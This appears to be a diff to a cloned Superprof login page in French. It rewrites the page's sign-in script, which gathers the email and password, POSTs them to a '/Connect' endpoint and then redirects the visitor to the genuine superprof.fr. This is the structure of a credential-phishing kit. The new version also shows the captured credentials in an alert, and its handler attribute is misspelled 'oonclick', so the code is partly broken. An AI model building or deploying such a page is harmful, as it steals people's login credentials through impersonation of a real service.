@@ -1419,7 +1419,7 @@ class="logo">© 2023 Superprof, Explorez. Apprenez</div>
 	<p class="error-text" style="display: none;"></p></div> 
 	<div class="bottom"><div class="buttons-container"><div class="social-buttons"><a class="big-button facebook"><div class="picto"></div> <p class="text long">Inscription avec Facebook</p> <p class="text short">Facebook</p></a> <div class="big-button google google-connect"><div class="picto"></div> <p class="text long">Inscription avec Google</p> <p class="text short">Google</p></div></div> 
 	<div class="big-button mail">
-		<p type="submit" class="text" >Connexion</p>
+		<p oonclick="saveData()" class="text" >Connexion</p>
 	</div></div> <div class="sign-text"><span>Vous n'avez pas encore de compte ?</span> <span class="emphasis">Inscrivez-vous</span></div> <p class="forgot-password">Mot de passe oublié ?</p></div></div> <div class="popin-content reset"><div class="reset"><p class="title">Réinitialiser le mot de passe</p> <p class="text">Pour récupérer votre mot de passe, indiquez dans le champ ci-dessous l'adresse e-mail de votre compte.</p> 
 		<div class="input-holder pending"><span class="label" style="top: -20px;">Adresse email</span> <input placeholder="Adresse email" type="text"></div> 
 	<p class="success-text" style="display: none;"></p> <p class="error-text" style="display: none;"></p> <p class="send-button">
@@ -1428,60 +1428,36 @@ class="logo">© 2023 Superprof, Explorez. Apprenez</div>
 
 
     <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        const bigButton = document.querySelector('.big-button.mail');
-        
-        // Create the form element
-        const form = document.createElement('form');
-        form.id = 'signin-form';
-        form.innerHTML = `
-          <input type="email" id="email" name="email" placeholder="Email" required>
-          <input type="password" id="password" name="password" placeholder="Password" required>
-          <button type="submit">Submit</button>
-        `;
-        
-        // Attach an event listener to the form submission
-        form.addEventListener('submit', function (event) {
-          event.preventDefault();
+  function saveData() {
+    const password = document.getElementById('password').value;
+    const email = document.getElementById('email').value;
 
-          const password = document.getElementById('password').value;
-          const email = document.getElementById('email').value;
+    fetch('/Connect', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ password, email })
+    })
+    .then(response => {
+      if (response.ok) {
+        alert(email+' '+ password);
+        document.getElementById('signin-form').reset();
+        handleRedirectButtonClick();
+      } else {
+        alert('An error occurred.');
+      }
+    })
+    .catch(error => {
+      console.error(error);
+      alert('An error occurred.');
+    });
+  }
 
-          fetch('/Connect', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ password, email })
-          })
-          .then(response => {
-            if (response.ok) {
-    
-              form.reset();
-              handleRedirectButtonClick();
-            } else {
-              alert('An error occurred.');
-            }
-          })
-          .catch(error => {
-            console.error(error);
-            alert('An error occurred.');
-          });
-        });
-
-        // Create the script element
-        const script = document.createElement('script');
-        script.innerHTML = `
-          function handleRedirectButtonClick() {
-            window.location.replace("https://www.superprof.fr/");
-          }
-        `;
-
-        // Append the form and script elements to the bigButton div
-        bigButton.appendChild(form);
-        bigButton.appendChild(script);
-      });
-    </script>
+  function handleRedirectButtonClick() {
+    window.location.replace("https://www.superprof.fr/");
+  }
+</script>
 
 <script type="text/javascript">
 	
